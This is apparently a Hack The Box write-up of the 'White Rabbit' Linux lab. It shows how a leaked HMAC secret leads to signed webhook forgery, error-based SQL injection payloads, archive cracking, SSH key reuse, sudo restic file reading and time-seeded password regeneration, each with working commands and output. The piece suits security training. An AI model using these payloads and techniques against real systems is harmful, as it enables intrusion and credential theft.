---
title: White Rabbit
layout: post
released: 2025-04-05
creators: FLX0x00
pwned: true
tags:
  - os/linux
  - diff/insane
category:
  - HTB
description: Whiterabbit is running a webserver on port 80. Fuzzing revealed uptime kuma app, with /status/temp containing subdomains. Found gophish and wikijs sites with webhook security docs. Exploited SQLi in webhook endpoint to access database showing command logs with restic backup repository and password. Downloaded repository containing Bob's SSH keys. SSH'd in, landing in Docker container with sudo privileges for restic. Used restic to read root folder with more SSH keys. Accessed box as Morpheus. Found password generator binary, recreated method to generate password list. Brute forced into Neo account which has root privileges.
image: https://labs.hackthebox.com/storage/avatars/acf63a6d45ca722a8203fe4ab82007a6.png
cssclasses:
  - custom_htb
---
![WhiteRabbit](https://labs.hackthebox.com/storage/avatars/acf63a6d45ca722a8203fe4ab82007a6.png)

# Information Gathering
## Enumeration
Our `nmap` scan revealed the following open ports.

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0fb05e9f8581c6cefaf497c299c5dbb3 (ECDSA)
|_  256 a919c355fe6a9a1b838f9d210a089547 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c8284c7a6f257b587665d82ed1eb4a26 (ECDSA)
|_  256 ad42c02877dd06bd1962d81730113c87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### White Rabbit Webserver
Visiting http://whiterabbit.htb shows a pentesting service website.
![WhiteRabbit-1743990877072.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743990877072.png)
# Foothold
There's not a lot to see on the web server so let's start fuzzing for vhosts.

```bash
 ffuf -u "http://whiterabbit.htb" -mc all -H "HOST: FUZZ.whiterabbit.htb" -w `fzf-wordlists` -fs 0

        / ___\  / ___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 299ms]
:: Progress: [4989/4989] :: Job [1/1] :: 137 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
```

We get http://status.whiterabbit.htb.

![WhiteRabbit-1743991567665.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743991567665.png)

Looking around we don't find anything interesting, let's start a recursive directory fuzz.
> Interesting to note that initial fuzzes show that if a directory is not found there's a custom 404 page which would actually provide a code of 200, so here we filter those out.
{:.info}

```bash
ffuf -u "http://status.whiterabbit.htb/FUZZ" -mc all -w `fzf-wordlists` -fc 200

        / ___\  / ___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 200
________________________________________________

assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 292ms]
upload                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 300ms]
status                  [Status: 404, Size: 2444, Words: 247, Lines: 39, Duration: 294ms]
screenshots             [Status: 301, Size: 189, Words: 7, Lines: 11, Duration: 300ms]
metrics                 [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 295ms]
:: Progress: [17769/17769] :: Job [1/1] :: 136 req/sec :: Duration: [0:02:11] :: Errors: 0 ::
```

One interesting code is `404` as there's a custom `404` page there should be no reason that a subdirectory would return a `404` code. This tells me that we're not getting the complete picture with `/status`. I'm assuming that it's a directory without directory listings on and doesn't redirect to an index. So let's fuzz if there's any subdirectories.

```bash
ffuf -u "http://status.whiterabbit.htb/status/FUZZ" -mc all -w `fzf-wordlists` -fc 404

        / ___\  / ___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/status/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 300ms]
:: Progress: [17769/17769] :: Job [1/1] :: 135 req/sec :: Duration: [0:02:12] :: Errors: 0 ::
```

We've successfully found http://status.whiterabbit.htb/status/temp.

![WhiteRabbit-1743992772380.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743992772380.png)

We can see 2 additional subdomains:

- http://ddb09a8558c9.whiterabbit.htb

![WhiteRabbit-1743992912498.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743992912498.png)

- http://a668910b5514e.whiterabbit.htb

![WhiteRabbit-1743992940238.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743992940238.png)

Within the [WikiJS](http://a668910b5514e.whiterabbit.htb/) we can find a page for [Gophish Webhooks](http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks). This page highlights how each post request comes with a signature whose key is only known to gophish.

![WhiteRabbit-1743993225599.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743993225599.png)

Additionally we can find another subdomain used for the webhooks:

- http://28efa8f7df.whiterabbit.htb

```http
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}
```

It is mentioned that this is done to avoid spoofed events, specifically `SQLi`.
>[Security Mechanism: Signature Verification] The x-gophish-signature in each request plays a crucial role in ensuring the integrity and security of the data received by n8n. This HMAC (Hash-Based Message Authentication Code) signature is generated by hashing the body of the request along with a secret key. The workflow’s verification of this signature ensures that the messages are not only intact but also are sent from an authorized source, significantly mitigating the risk of spoofed events for example SQLi attempts.

This would be very secure as we shouldn't have a seed... However, we're provided with a `json` file that showcases the workflow.
http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json

![WhiteRabbit-1743993806415.png](/assets/img/img_WhiteRabbit/WhiteRabbit-1743993806415.png)

We can see the cleartext secret here:

```json
 {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    }
```

We can attempt to create a signature using the secret using the previously provided `POST` request to verify if our signature is generated correctly.

```bash
echo -n '{"campaign_id":1,"email":"test@ex.com","message":"Clicked Link"}' | openssl dgst -sha256 -hmac "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS" | grep cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd -o
cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
```

We can see that the two signatures match! We can now theoretically inject any request provided we calculate a signature beforehand.

Let's do some testing, here's a request and response with an invalid signature.

```http
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=bogus signature lmao
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 66

{"campaign_id":1,"email":"w1ld@w1ld.com","message":"Clicked Link"}
```

```http
HTTP/1.1 200 OK
Content-Length: 38
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Apr 2025 02:55:48 GMT
Etag: W/"26-BLGb+A8n+h1LFIUMh0EeL11CUfw"
Server: Caddy
Vary: Accept-Encoding

Error: Provided signature is not valid
```

On the other hand, here's one with a valid signature.

```http
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=b623bed29b5c6aae24fb30b67cc579be08e2aa47a8c17b7417abd083d51b83fd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 66

{"campaign_id":1,"email":"w1ld@w1ld.com","message":"Clicked Link"}
```

```
HTTP/1.1 200 OK
Content-Length: 29
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Apr 2025 02:56:50 GMT
Etag: W/"1d-c+SgTmm7aoV3zT83YVlLE+EDHLI"
Server: Caddy
Vary: Accept-Encoding

Info: User is not in database
```
 
 The text has been hinting at an `SQLi` attack, additionally several `SQL` queries can be found in the `json` file which we grabbed earlier, I don't know about you but it sure as hell smells to me like an `SQLi` attack is in order.

## SQLi Attack

Note the following from the `json` file:

- Database is `mysql mariadb`
 
We can make this easier on ourselves through creating a script using `ChatGPT`.

`webhook.sh`:

```bash
#!/bin/bash

# ┌─────────────────────────────────────────────┐
# │ Gophish Webhook Signature & CURL Automation │
# └─────────────────────────────────────────────┘

# Hardcoded secret and webhook URL
SECRET="3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
URL="https://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"

# Check input
if [ -z "$1" ]; then
  echo "Usage: $0 <payload.json>"
  exit 1
fi

# Read and normalize the payload
JSON_FILE="$1"
PAYLOAD=$(tr -d '\n\r' < "$JSON_FILE")

# Generate HMAC-SHA256 signature
SIGNATURE=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" | sed 's/^.* //')

# Output debug info
echo "[+] Signature: sha256=$SIGNATURE"
echo "[+] Sending to: $URL"
echo "[+] Payload:"
echo "$PAYLOAD"
echo

# Send the request with curl
curl -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -H "x-gophish-signature: sha256=$SIGNATURE" \
  -d "$PAYLOAD"

```

`payload.json`:

```json
{"campaign_id":1,"email":"w1ld@w1ld.com","message:""Clicked Link"}
```

Output:

```bash
./webhook.sh payload.json
[+] Signature: sha256=b623bed29b5c6aae24fb30b67cc579be08e2aa47a8c17b7417abd083d51b83fd
[+] Sending to: http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[+] Payload:
{"campaign_id":1,"email":"w1ld@w1ld.com","message":"Clicked Link"}

Info: User is not in database
```

Looking at the `json` we can determine that the character used for the query is `"` and not the usual `'`.

```json
{
"query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1"
}
```

The following provides us with an SQL error.

```json
[+] Signature: sha256=97654a259f015c0638fe057a0535ccd9d9cd038b50fc175455c55aca68c9c368
[+] Sending to: http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[+] Payload:
{"campaign_id":0,"email":"w1ld\" UNION SELECT 1 -- -","message":"Clicked Link"}

The used SELECT statements have a different number of columns | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1744003098970,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"w1ld\" UNION SELECT 1 -- -\" LIMIT 1, code: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT"}
```

Based off of this let's try some error based SQLi.

```json
[+] Signature: sha256=22bcdcdc4c0ab4a9291577c2171428da7b1cd742206c8c2f77db49d1fef398f4
[+] Sending to: http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[+] Payload:
{"campaign_id":0,"email":"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))-- -","message":"Clicked Link"}

XPATH syntax error: '\phishing' | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1744003859553,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))-- -\" LIMIT 1, code: ER_UNKNOWN_ERROR"}
```

We can find the database: `phishing`, let's see what other databases there are.

```json
[+] Signature: sha256=bbed4073eac8db157fe25b8efdfb29156591b3ba4b522ce9575bd9c700b6ec36
[+] Sending to: http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[+] Payload:
{"campaign_id":1,"email":"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 2)))-- -","message":"Clicked Link"}

XPATH syntax error: '\temp' | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1744004772796,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 2)))-- -\" LIMIT 1, code: ER_UNKNOWN_ERROR"}
```

We found a `temp` database, let's enumerate tables.

```json
[+] Signature: sha256=37554a57da787e0c1ba69b91284c56005aec3825e4bffaad068361039aae3e91
[+] Sending to: http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[+] Payload:
{"campaign_id":1,"email":"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='temp')))-- -","message":"Clicked Link"}

XPATH syntax error: '\command_log' | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1744004890034,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='temp')))-- -\" LIMIT 1, code: ER_UNKNOWN_ERROR"}
```

We found the table `command_log`, let's keep going with enumerating the columns.

```json
[+] Signature: sha256=47c8f7d9a66e9a884cd33f87538c8f54f38b4dd527e596d7554e9706f3e492e8
[+] Sending to: http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[+] Payload:
{"campaign_id":1,"email":"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='command_log')))-- -","message":"Clicked Link"}

XPATH syntax error: '\id,command,date' | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1744004995832,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"w1ld\" UNION SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='command_log')))-- -\" LIMIT 1, code: ER_UNKNOWN_ERROR"}
```

We find `id`,`command`, and `date` columns. Some of the commands are too long so we can use `SUBSTR(command,20,20)` to get a substring from the output that is at index `20` and is `20` characters long

Here's the commands that have been sent:
- `uname -a`
- `restic init --repo rest:http://75951e6ff.whiterabbit.htb`
- `echo ygc[REDACTED] > .restic_passwd`
- `rm -rf .bash_history`
- `#thatwasclose` (?)
- `cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd` 

We have recovered a `restic` password.

```
ygc[REDACTED]
```

 And the user: `neo`, and we also know that he has a password generator and has recently changed his password.

We can interact with the `restic` repo and list it's snapshots.

```bash
restic -r rest:http://75951e6ff.whiterabbit.htb/ snapshots
enter password for repository:
repository 5b26a938 opened (repository version 2) successfully, password is correct
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-07 11:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

Let's restore this snapshot into a directory.

```bash
restic -r rest:http://75951e6ff.whiterabbit.htb/ restore 272cacd5 --target ./rest
enter password for repository:
Fatal: an empty password is not a password. Try again
enter password for repository:
repository 5b26a938 opened (repository version 2) successfully, password is correct
restoring <Snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit> to ./rest
```

we can find `/dev/shm/bob/ssh/bob.7z` however, when we try to extract it we can see it's password protected.

```bash
7z e bob.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)
Extracting archive: bob.7z--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1


Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : bob
ERROR: Data Error in encrypted file. Wrong password? : bob.pub
ERROR: Data Error in encrypted file. Wrong password? : config

Sub items Errors: 3

Archives with Errors: 1

Sub items Errors: 3
```

So let's use `7z2john.pl` to grab hashes.

```bash
7z2john.pl bob.7z
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$729[REDACTED]$399$00
```

So let's run `john`.

```bash
john --wordlist=`fzf-wordlists` bob.pem
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 SSE2 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 16 OpenMP threads
Note: Passwords longer than 28 rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:01:50 0.10% (ETA: 2025-04-09 00:18) 0g/s 152.9p/s 152.9c/s 152.9C/s rocafella..felton
1q2w3e4r5t6y     (bob.7z)
1g 0:00:02:35 DONE (2025-04-07 17:04) 0.006431g/s 153.5p/s 153.5c/s 153.5C/s 230891..091184
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We get a password! Let's unzip it.

```bash
7z e bob.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1


Enter password (will not be echoed):
Everything is Ok

Files: 3
Size:       557
Compressed: 572
```

We get an ed25519 ssh key in `bob`.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[REDACTED]
-----END OPENSSH PRIVATE KEY-----
```

And the `config` file specifies the port that is being used.
```
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

Let's ssh onto the machine using the ssh key and port we found.

```bash
ssh -p 2222 bob@whiterabbit.htb -i bob
The authenticity of host '[whiterabbit.htb]:2222 ([10.129.231.12]:2222)' cant be established.
ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[whiterabbit.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bob@ebdce80611e9:~$
```

We have successfully gained a foothold on the target!
# User

We can see that we're in a docker container as you can tell by the docker file in the root directory.

```bash
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

Looking around at our permissions we can run `restic` as root. We can use these permissions to read any file we want within the docker.
Let's first initialize a repository in the `/tmp` directory.

```bash
bob@ebdce80611e9:~$ sudo restic -r /tmp init
enter password for new repository:
enter password again:
created restic repository 3a493fa37a at /tmp

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Let's use this repository to create a backup of the `/root` folder.

```bash
bob@ebdce80611e9:~$ sudo restic -r /tmp backup /root
enter password for repository:
repository 3a493fa3 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files


Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.602 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot 9f4037f9 saved
```

Looking at the root directory there's a couple of what looks to be ssh keys.

```bash
bob@ebdce80611e9:~$ sudo restic -r /tmp ls latest
enter password for repository:
repository 3a493fa3 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot 9f4037f9 of [/root] filtered by [] at 2025-04-12 06:24:47.445937566 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```

We can use the `dump` command to read these files.

```bash
bob@ebdce80611e9:~$ sudo restic -r /tmp dump latest /root/morpheus
enter password for repository:
repository 3a493fa3 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
[REDACTED]
-----END OPENSSH PRIVATE KEY-----
```

Let's transfer this key to our attacking machine and attempt to ssh.

```bash
ssh morpheus@whiterabbit.htb -i morpheus
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Last login: Sat Apr 12 06:36:04 2025 from 10.10.14.12
morpheus@whiterabbit:~$
```

# Root
Recalling the commands from the `SQLi` we can see the `neo-password-generator` in the `/opt` directory.
Within the directory we can see the binary used in the earlier command.

```bash
morpheus@whiterabbit:/opt$ ls -la
total 20
drwxr-xr-x  5 root root 4096 Aug 30  2024 .
drwxr-xr-x 22 root root 4096 Mar 24 13:42 ..
drwx--x--x  4 root root 4096 Aug 27  2024 containerd
drwxr-x--- 10 root root 4096 Sep 16  2024 docker
drwxr-xr-x  2 root root 4096 Aug 30  2024 neo-password-generator
```

Let's transfer this back to our local machine and analyse it.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <stdint.h>

void generate_password(uint32_t seed) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const int charset_size = 62;
    
    char password[20];
    int i;
    int random_index;
    
    srand(seed);
    
    for (i = 0; i < 20; i++) {
        random_index = rand() % charset_size;
        password[i] = charset[random_index];
    }
    
    password[i] = '\0';
    puts(password);
}

int main(void) {
    struct timeval current_time;
    uint32_t seed;
    
    gettimeofday(&current_time, NULL);
    seed = current_time.tv_sec * 1000 + current_time.tv_usec / 1000;
    
    generate_password(seed);
    
    return 0;
}
```

Based on the generation method let's use the following script to generate a list of passwords.

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    printf("Generating Passwords...\n");
    FILE *file = fopen("pass.txt", "w");
    if (!file) {
        perror("File opening failed");
        return 1;
    }
    struct tm time = {0};
    time.tm_year = 124; //2024
    time.tm_mon  = 7; //August
    time.tm_mday = 30;
    time.tm_hour = 14;
    time.tm_min  = 40;
    time.tm_sec  = 42;
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char pass[21];
    time_t start_time = timegm(&time);

    for (int c = 0; c < 1000; c++) {
        srand(start_time * 1000 + c);
        for (int i = 0; i < 20; i++) {
            pass[i] = charset[rand() % 62];
        }
        pass[20] = '\0';
        fprintf(file, "%s\n", pass);
    }
    printf("Done!");
    fclose(file);
    return 0;
}
```

Note that the start time used is based on the database dump where the exact time is shown in the `date` field. `2024-08-30 14:40:42`

```SQL
2024-08-30 14:40:42 cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
